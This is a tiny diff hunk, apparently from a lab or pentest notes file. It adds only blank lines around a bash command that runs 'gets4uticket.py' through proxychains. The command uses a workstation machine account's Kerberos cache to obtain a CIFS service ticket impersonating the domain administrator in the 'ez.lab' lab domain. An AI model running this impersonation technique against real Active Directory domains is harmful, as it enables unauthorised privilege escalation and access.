@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:05.079234+00:00'
 ```bash
 proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
 ```
+
+
